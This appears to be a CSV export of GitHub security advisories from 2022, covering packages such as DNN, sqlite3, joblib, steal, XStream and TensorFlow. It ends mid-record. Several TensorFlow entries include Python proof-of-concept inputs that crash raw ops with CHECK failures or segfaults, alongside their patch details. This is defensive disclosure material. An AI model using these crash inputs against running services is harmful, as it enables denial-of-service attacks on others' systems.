3035,15223,DotNetNuke.Core,GHSA-9w72-2f23-57gm,CVE-2022-2922,https://github.com/advisories/GHSA-9w72-2f23-57gm,moderate,2022-10-01 00:00:25 UTC,DNN vulnerable to Relative Path Traversal,DNN (GitHub repository dnnsoftware/dnn.platform) prior to 9.11.0 is vulnerable to Relative Path Traversal. Version 9.11.0 contains a patch for this issue.,nuget
3036,18820,sqlite3,GHSA-mgvv-5mxp-xq67,,https://github.com/advisories/GHSA-mgvv-5mxp-xq67,low,2022-10-03 22:12:28 UTC,SQLite3 addresses vulnerability in packaged version of libsqlite,"### Summary

The rubygem sqlite3 v1.5.1 upgrades the packaged version of libsqlite from v3.39.3 to [v3.39.4](https://sqlite.org/releaselog/3_39_4.html).

libsqlite v3.39.4 addresses a vulnerability described as follows in the release notification:

> Version 3.39.4 is a minimal patch against the prior release that addresses issues found since the
> prior release. In particular, a potential vulnerability in the FTS3 extension has been fixed, so
> this should be considered a security update.
>
> In order to exploit the vulnerability, an attacker must have full SQL access and must be able to
> construct a corrupt database with over 2GB of FTS3 content. The problem arises from a 32-bit
> signed integer overflow.

This vulnerability has not been assigned a CVE and does not have a severity declared.

Please note that this advisory only applies to the sqlite3 gem v1.5.0, and only if the packaged libsqlite is being used. If you've overridden defaults at installation time to use system libraries instead of packaged libraries, you should instead pay attention to your distro's libsqlite release announcements.


### Mitigation

Upgrade to the rubygem sqlite3 v1.5.1 or later.

Users who are unable to upgrade the sqlite3 gem may also choose a more complicated mitigation: compile and link sqlite3 against external libsqlite >= 3.39.4 which will also address these same issues.


### References

- Upstream release notes: https://sqlite.org/releaselog/3_39_4.html
- Instructions for compiling against system libraries: https://github.com/sparklemotion/sqlite3-ruby",rubygems
3037,15578,CompositeC1.Core,GHSA-gfhp-jgp6-838j,CVE-2022-39256,https://github.com/advisories/GHSA-gfhp-jgp6-838j,critical,2022-09-30 04:54:06 UTC,Orckestra C1 CMS's deserialization of untrusted data allows for arbitrary code execution.,"### Impact

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Orckestra C1 CMS. 
Authentication is required to exploit this vulnerability.
The authenticated user may perform the actions unknowingly by visiting a specially crafted site.

### Patches
Patched in C1 CMS v6.13

### Workarounds
Upgrade to C1 CMS v6.13 or newer is required

### Credit
This issue was discovered and reported by Markus Wulftange  / [Code White Research](https://code-white.com/en/).
",nuget
3038,20033,joblib,GHSA-6hrg-qmvc-2xh8,CVE-2022-21797,https://github.com/advisories/GHSA-6hrg-qmvc-2xh8,critical,2022-09-27 00:00:22 UTC,joblib vulnerable to arbitrary code execution,The package joblib from 0 and before 1.2.0 is vulnerable to Arbitrary Code Execution via the `pre_dispatch` flag in `Parallel()` class due to the `eval()` statement.,pip
3039,34266,org.codehaus.jettison:jettison,GHSA-x27m-9w8j-5vcw,CVE-2022-40150,https://github.com/advisories/GHSA-x27m-9w8j-5vcw,low,2022-09-17 00:00:41 UTC,Jettison memory exhaustion,"Those using Jettison to parse untrusted XML or JSON data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by Out of memory. This effect may support a denial of service attack.",maven
3040,33870,org.scala-lang:scala-library,GHSA-8qv5-68g4-248j,CVE-2022-36944,https://github.com/advisories/GHSA-8qv5-68g4-248j,critical,2022-09-25 00:00:20 UTC,"Scala subject to file deletion, code execution due to Java deserialization chain with LazyList object deserialization","Scala 2.13.x before 2.13.9 has a Java deserialization chain in its JAR file. On its own, it cannot be exploited. There is only a risk in conjunction with LazyList object deserialization within an application. In such situations, it allows attackers to erase contents of arbitrary files, make network connections, or possibly run arbitrary code (specifically, Function0 functions) via a gadget chain.",maven
3041,19862,protobuf,GHSA-8gq9-2x98-w8hf,CVE-2022-1941,https://github.com/advisories/GHSA-8gq9-2x98-w8hf,moderate,2022-09-23 20:31:15 UTC,protobuf-cpp and protobuf-python have potential Denial of Service issue,"### Summary

A message parsing and memory management vulnerability in ProtocolBuffer’s C++ and Python implementations can trigger an out of memory (OOM) failure when processing a specially crafted message, which could lead to a denial of service (DoS) on services using the libraries.

Reporter: [ClusterFuzz](https://google.github.io/clusterfuzz/)

Affected versions: All versions of C++ Protobufs (including Python) prior to the versions listed below.

### Severity & Impact

**Medium 5.7** - [CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)

A small (~500 KB) malicious payload can be constructed which causes the running service to allocate more than 3GB of RAM.

### Proof of Concept

For reproduction details, please refer to the unit test that identifies the specific inputs that exercise this parsing weakness.

### Mitigation / Patching

Please update to the latest available versions of the following packages:
- protobuf-cpp (3.18.3, 3.19.5, 3.20.2, 3.21.6)
- protobuf-python (3.18.3, 3.19.5, 3.20.2, 4.21.6)",pip
3042,18161,steal,GHSA-gvjw-8mmr-8f6g,CVE-2022-37258,https://github.com/advisories/GHSA-gvjw-8mmr-8f6g,critical,2022-09-17 00:00:30 UTC,steal vulnerable to Prototype Pollution,Prototype pollution vulnerability in function convertLater in npm-convert.js in stealjs steal 2.2.4 via the packageName variable in npm-convert.js.,npm
3043,20810,apache-airflow,GHSA-5rp4-749p-vx26,CVE-2022-40604,https://github.com/advisories/GHSA-5rp4-749p-vx26,high,2022-09-22 22:40:27 UTC,Apache Airflow vulnerable to Use of Externally-Controlled Format String,"In Apache Airflow 2.3.0 through 2.3.4, part of a url was unnecessarily formatted, allowing for possible information extraction.",pip
3044,20810,apache-airflow,GHSA-4fg5-j4mm-wfpg,CVE-2022-40754,https://github.com/advisories/GHSA-4fg5-j4mm-wfpg,moderate,2022-09-22 22:39:52 UTC,Apache Airflow vulnerable to open redirect,"In Apache Airflow 2.3.0 through 2.3.4, there was an open redirect in the webserver's `/confirm` endpoint.",pip
3045,18161,steal,GHSA-wc4x-qmr2-rj8h,CVE-2022-37265,https://github.com/advisories/GHSA-wc4x-qmr2-rj8h,critical,2022-09-21 00:00:38 UTC,steal vulnerable to Prototype Pollution via alias variable,Prototype pollution vulnerability in stealjs steal via the alias variable in babel.js.,npm
3046,18161,steal,GHSA-rgqx-226f-2xp4,CVE-2022-37259,https://github.com/advisories/GHSA-rgqx-226f-2xp4,high,2022-09-21 00:00:38 UTC,steal Inefficient Regular Expression Complexity vulnerability via string variable,A Regular Expression Denial of Service (ReDoS) flaw was found in stealjs steal 2.2.4 via the string variable in babel.js.,npm
3047,18161,steal,GHSA-93q5-3xpc-8vg3,CVE-2022-37257,https://github.com/advisories/GHSA-93q5-3xpc-8vg3,critical,2022-09-16 00:00:39 UTC,steal vulnerable to Prototype Pollution via requestedVersion variable,Prototype pollution vulnerability in function convertLater in npm-convert.js in stealjs steal via the requestedVersion variable in the npm-convert.js file.,npm
3048,18161,steal,GHSA-vwhq-pm3r-fjm9,CVE-2022-37266,https://github.com/advisories/GHSA-vwhq-pm3r-fjm9,critical,2022-09-16 00:00:39 UTC,steal vulnerable to Prototype Pollution via key variable in babel.js,Prototype pollution vulnerability in function extend in babel.js in stealjs steal via the key variable in babel.js.,npm
3049,18161,steal,GHSA-28v4-jf82-jvj8,CVE-2022-37262,https://github.com/advisories/GHSA-28v4-jf82-jvj8,high,2022-09-16 00:00:36 UTC,steal vulnerable to Regular Expression Denial of Service via source and sourceWithComments,A Regular Expression Denial of Service (ReDoS) flaw was found in stealjs steal via the source and sourceWithComments variable in main.js.,npm
3050,18161,steal,GHSA-8f8g-9j73-7p82,CVE-2022-37264,https://github.com/advisories/GHSA-8f8g-9j73-7p82,critical,2022-09-16 00:00:36 UTC,steal vulnerable to Prototype Pollution via optionName variable,Prototype pollution vulnerability in stealjs steal 2.2.4 via the optionName variable in main.js.,npm
3051,18161,steal,GHSA-7f3x-2wcx-hww8,CVE-2022-37260,https://github.com/advisories/GHSA-7f3x-2wcx-hww8,low,2022-09-16 00:00:31 UTC,steal vulnerable to Regular Expression Denial of Service via input variable in main.js,A Regular Expression Denial of Service (ReDoS) flaw was found in stealjs steal via the input variable in main.js.,npm
3052,17149,vuetify,GHSA-q4q5-c5cv-2p68,CVE-2022-25873,https://github.com/advisories/GHSA-q4q5-c5cv-2p68,moderate,2022-09-19 00:00:28 UTC,Vuetify Cross-site Scripting vulnerability,The package vuetify from 2.0.0-beta.4 and before 2.6.10 are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization in the 'eventName' function within the VCalendar component.,npm
3053,34016,com.thoughtworks.xstream:xstream,GHSA-9fwf-46g9-45rx,CVE-2022-40154,https://github.com/advisories/GHSA-9fwf-46g9-45rx,low,2022-09-17 00:00:41 UTC,XStream Denial of Service via stack overflow,"Those using Xstream to serialise XML data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack overflow. This effect may support a denial of service attack.",maven
3054,34016,com.thoughtworks.xstream:xstream,GHSA-5hc5-c3m9-8vcj,CVE-2022-40155,https://github.com/advisories/GHSA-5hc5-c3m9-8vcj,low,2022-09-17 00:00:41 UTC,XStream Denial of Service via stack overflow,"Those using Xstream to serialise XML data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack overflow. This effect may support a denial of service attack.",maven
3055,19702,commonmarker,GHSA-4qw4-jpp4-8gvp,,https://github.com/advisories/GHSA-4qw4-jpp4-8gvp,moderate,2022-09-21 18:18:05 UTC,Unbounded resource exhaustion in cmark-gfm autolink extension may lead to denial of service,"### Impact

CommonMarker uses `cmark-gfm` for rendering [Github Flavored Markdown](https://github.github.com/gfm/). A polynomial time complexity issue in cmark-gfm's autolink extension may lead to unbounded resource exhaustion and subsequent denial of service.

### Patches

This vulnerability has been patched in the following CommonMarker release:

- v0.23.6

### Workarounds

Disable use of the autolink extension.

### References

https://github.com/gjtorikian/commonmarker/pull/190
https://github.com/github/cmark-gfm/security/advisories/GHSA-cgh3-p57x-9q7q
https://en.wikipedia.org/wiki/Time_complexity

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [github/cmark-gfm](https://github.com/github/cmark-gfm)

### Acknowledgements

We would like to thank [Legit Security](https://www.legitsecurity.com) for reporting this vulnerability.
",rubygems
3056,34266,org.codehaus.jettison:jettison,GHSA-56h3-78gp-v83r,CVE-2022-40149,https://github.com/advisories/GHSA-56h3-78gp-v83r,moderate,2022-09-17 00:00:41 UTC,Jettison parser crash by stackoverflow,"Those using Jettison to parse untrusted XML or JSON data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3057,34016,com.thoughtworks.xstream:xstream,GHSA-3mq5-fq9h-gj7j,CVE-2022-40151,https://github.com/advisories/GHSA-3mq5-fq9h-gj7j,low,2022-09-17 00:00:41 UTC,XStream Denial of Service due to parser crash,"Those using Xstream to seralize XML data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3058,34016,com.thoughtworks.xstream:xstream,GHSA-3f7h-mf4q-vrm4,CVE-2022-40152,https://github.com/advisories/GHSA-3f7h-mf4q-vrm4,low,2022-09-17 00:00:41 UTC,XStream Denial of Service due to parser crash,"Those using Xstream to seralize XML data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3059,34016,com.thoughtworks.xstream:xstream,GHSA-4rv7-wj6m-6c6r,CVE-2022-40156,https://github.com/advisories/GHSA-4rv7-wj6m-6c6r,low,2022-09-17 00:00:41 UTC,XStream Denial of Service due to parser crash,"Those using XStream to seralize XML data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3060,34016,com.thoughtworks.xstream:xstream,GHSA-fv22-xp26-mm9w,CVE-2022-40153,https://github.com/advisories/GHSA-fv22-xp26-mm9w,high,2022-09-17 00:00:41 UTC,XStream Denial of Service due to parser crash,"Those using XStream to seralize XML data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.",maven
3061,18810,bootstrap,GHSA-3wqf-4x89-9g79,CVE-2018-14040,https://github.com/advisories/GHSA-3wqf-4x89-9g79,moderate,2022-05-13 01:07:54 UTC,Bootstrap vulnerable to Cross-Site Scripting (XSS),"In Bootstrap 4.x before 4.1.2, XSS is possible in the collapse data-parent attribute.",npm
3062,20741,tensorflow,GHSA-m6vp-8q9j-whx4,CVE-2022-35983,https://github.com/advisories/GHSA-m6vp-8q9j-whx4,moderate,2022-09-16 22:31:14 UTC,TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`,"### Impact
If `Save` or `SaveSlices` is run over tensors of an unsupported `dtype`, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
filename = tf.constant("""")
tensor_names = tf.constant("""")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("""")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
```

### Patches
We have patched the issue in GitHub commit [5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4](https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University
",pip
3063,20741,tensorflow,GHSA-p2xf-8hgm-hpw5,CVE-2022-35984,https://github.com/advisories/GHSA-p2xf-8hgm-hpw5,moderate,2022-09-16 22:30:29 UTC,TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`,"### Impact
`ParameterizedTruncatedNormal` assumes `shape` is of type `int32`. A valid `shape` of type `int64` results in a mismatched type `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
```

### Patches
We have patched the issue in GitHub commit [72180be03447a10810edca700cbc9af690dfeb51](https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University
",pip
3064,20741,tensorflow,GHSA-9942-r22v-78cp,CVE-2022-35985,https://github.com/advisories/GHSA-9942-r22v-78cp,moderate,2022-09-16 22:29:52 UTC,TensorFlow vulnerable to `CHECK` fail in `LRNGrad`,"### Impact
If `LRNGrad` is given an `output_image` input tensor that is not 4-D, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
depth_radius = 1
bias = 1.59018219
alpha = 0.117728651
beta = 0.404427052
input_grads = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
input_image = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
output_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
tf.raw_ops.LRNGrad(input_grads=input_grads, input_image=input_image, output_image=output_image, depth_radius=depth_radius, bias=bias, alpha=alpha, beta=beta)
```

### Patches
We have patched the issue in GitHub commit [bd90b3efab4ec958b228cd7cfe9125be1c0cf255](https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University
",pip
3065,20741,tensorflow,GHSA-wr9v-g9vf-c74v,CVE-2022-35986,https://github.com/advisories/GHSA-wr9v-g9vf-c74v,moderate,2022-09-16 22:29:01 UTC,TensorFlow vulnerable to segfault in `RaggedBincount`,"### Impact
If `RaggedBincount` is given an empty input tensor `splits`, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
binary_output = True
splits = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-7430)
values = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
tf.raw_ops.RaggedBincount(splits=splits, values=values, size=size, weights=weights, binary_output=binary_output)
```

### Patches
We have patched the issue in GitHub commit [7a4591fd4f065f4fa903593bc39b2f79530a74b8](https://github.com/tensorflow/tensorflow/commit/7a4591fd4f065f4fa903593bc39b2f79530a74b8).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University
",pip
3066,20741,tensorflow,GHSA-9vqj-64pv-w55c,CVE-2022-35988,https://github.com/advisories/GHSA-9vqj-64pv-w55c,moderate,2022-09-16 22:28:41 UTC,TensorFlow vulnerable to `CHECK` fail in `tf.linalg.matrix_rank`,"### Impact
When `tf.linalg.matrix_rank` receives an empty input `a`, the GPU kernel gives a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

a = tf.constant([], shape=[0, 1, 1], dtype=tf.float32)
tf.linalg.matrix_rank(a=a)
```

### Patches
We have patched the issue in GitHub commit [c55b476aa0e0bd4ee99d0f3ad18d9d706cd1260a](https://github.com/tensorflow/tensorflow/commit/c55b476aa0e0bd4ee99d0f3ad18d9d706cd1260a).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Kang Hong Jin.
",pip
3067,20741,tensorflow,GHSA-j43h-pgmg-5hjq,CVE-2022-35989,https://github.com/advisories/GHSA-j43h-pgmg-5hjq,moderate,2022-09-16 22:28:06 UTC,TensorFlow vulnerable to `CHECK` fail in `MaxPool`,"### Impact
When `MaxPool` receives a window size input array `ksize` with dimensions greater than its input tensor `input`, the GPU kernel gives a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np

input = np.ones([1, 1, 1, 1])
ksize = [1, 1, 2, 2]
strides = [1, 1, 1, 1]
padding = 'VALID'
data_format = 'NCHW'

tf.raw_ops.MaxPool(input=input, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

### Patches
We have patched the issue in GitHub commit [32d7bd3defd134f21a4e344c8dfd40099aaf6b18](https://github.com/tensorflow/tensorflow/commit/32d7bd3defd134f21a4e344c8dfd40099aaf6b18).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Jingyi Shi.
",pip
3068,20741,tensorflow,GHSA-397c-5g2j-qxpv,CVE-2022-35982,https://github.com/advisories/GHSA-397c-5g2j-qxpv,moderate,2022-09-16 22:27:28 UTC,TensorFlow vulnerable to segfault in `SparseBincount`,"### Impact
If `SparseBincount` is given inputs for `indices`, `values`, and `dense_shape` that do not make a valid sparse tensor, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
binary_output = True
indices = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int64, seed=-1288)
values = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-9366)
dense_shape = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-9878)
size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
tf.raw_ops.SparseBincount(indices=indices, values=values, dense_shape=dense_shape, size=size, weights=weights, binary_output=binary_output)
```

### Patches
We have patched the issue in GitHub commit [40adbe4dd15b582b0210dfbf40c243a62f5119fa](https://github.com/tensorflow/tensorflow/commit/40adbe4dd15b582b0210dfbf40c243a62f5119fa).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University
",pip
3069,20741,tensorflow,GHSA-vxv8-r8q2-63xw,CVE-2022-35981,https://github.com/advisories/GHSA-vxv8-r8q2-63xw,moderate,2022-09-16 22:26:57 UTC,TensorFlow vulnerable to `CHECK` fail in `FractionalMaxPoolGrad`,"### Impact
`FractionalMaxPoolGrad` validates its inputs with `CHECK` failures instead of with returning errors. If it gets incorrectly sized inputs, the `CHECK` failure can be used to trigger a denial of service attack:
```python
import tensorflow as tf

overlapping = True
orig_input = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
orig_output = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
out_backprop = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
row_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)
col_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)
tf.raw_ops.FractionalMaxPoolGrad(orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)
```

### Patches
We have patched the issue in GitHub commit [8741e57d163a079db05a7107a7609af70931def4](https://github.com/tensorflow/tensorflow/commit/8741e57d163a079db05a7107a7609af70931def4).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",pip
3070,20741,tensorflow,GHSA-v7vw-577f-vp8x,CVE-2022-35979,https://github.com/advisories/GHSA-v7vw-577f-vp8x,moderate,2022-09-16 22:26:12 UTC,TensorFlow vulnerable to segfault in `QuantizedRelu` and `QuantizedRelu6`,"### Impact
If `QuantizedRelu` or `QuantizedRelu6` are given nonscalar inputs for `min_features` or `max_features`, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

out_type = tf.quint8
features = tf.constant(28, shape=[4,2], dtype=tf.quint8)
min_features = tf.constant([], shape=[0], dtype=tf.float32)
max_features = tf.constant(-128, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedRelu(features=features, min_features=min_features, max_features=max_features, out_type=out_type)
tf.raw_ops.QuantizedRelu6(features=features, min_features=min_features, max_features=max_features, out_type=out_type)
```

### Patches
We have patched the issue in GitHub commit [49b3824d83af706df0ad07e4e677d88659756d89](https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",pip
3071,20741,tensorflow,GHSA-vgvh-2pf4-jr2x,CVE-2022-35974,https://github.com/advisories/GHSA-vgvh-2pf4-jr2x,moderate,2022-09-16 22:23:45 UTC,TensorFlow vulnerable to segfault in `QuantizeDownAndShrinkRange`,"### Impact
If `QuantizeDownAndShrinkRange` is given nonscalar inputs for `input_min` or `input_max`, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

out_type = tf.quint8
input = tf.constant([1], shape=[3], dtype=tf.qint32)
input_min = tf.constant([], shape=[0], dtype=tf.float32)
input_max = tf.constant(-256, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizeDownAndShrinkRange(input=input, input_min=input_min, input_max=input_max, out_type=out_type)
```

### Patches
We have patched the issue in GitHub commit [73ad1815ebcfeb7c051f9c2f7ab5024380ca8613](https://github.com/tensorflow/tensorflow/commit/73ad1815ebcfeb7c051f9c2f7ab5024380ca8613).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3072,20741,tensorflow,GHSA-689c-r7h2-fv9v,CVE-2022-35973,https://github.com/advisories/GHSA-689c-r7h2-fv9v,moderate,2022-09-16 22:22:27 UTC,TensorFlow vulnerable to segfault in `QuantizedMatMul`,"### Impact
If `QuantizedMatMul` is given nonscalar input for:
 - `min_a`
 - `max_a`
 - `min_b`
 - `max_b`
It gives a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

Toutput = tf.qint32
transpose_a = False
transpose_b = False
Tactivation = tf.quint8
a = tf.constant(7, shape=[3,4], dtype=tf.quint8)
b = tf.constant(1, shape=[2,3], dtype=tf.quint8)
min_a = tf.constant([], shape=[0], dtype=tf.float32)
max_a = tf.constant(0, shape=[1], dtype=tf.float32)
min_b = tf.constant(0, shape=[1], dtype=tf.float32)
max_b = tf.constant(0, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedMatMul(a=a, b=b, min_a=min_a, max_a=max_a, min_b=min_b, max_b=max_b, Toutput=Toutput, transpose_a=transpose_a, transpose_b=transpose_b, Tactivation=Tactivation)
```

### Patches
We have patched the issue in GitHub commit [aca766ac7693bf29ed0df55ad6bfcc78f35e7f48](https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3073,20741,tensorflow,GHSA-4pc4-m9mj-v2r9,CVE-2022-35972,https://github.com/advisories/GHSA-4pc4-m9mj-v2r9,moderate,2022-09-16 22:20:36 UTC,TensorFlow vulnerable to segfault in `QuantizedBiasAdd`,"### Impact
If `QuantizedBiasAdd` is given `min_input`, `max_input`, `min_bias`, `max_bias` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

out_type = tf.qint32
input = tf.constant([85,170,255], shape=[3], dtype=tf.quint8)
bias = tf.constant(43, shape=[2,3], dtype=tf.quint8)
min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[1], dtype=tf.float32)
min_bias = tf.constant(0, shape=[1], dtype=tf.float32)
max_bias = tf.constant(0, shape=[1], dtype=tf.float32)
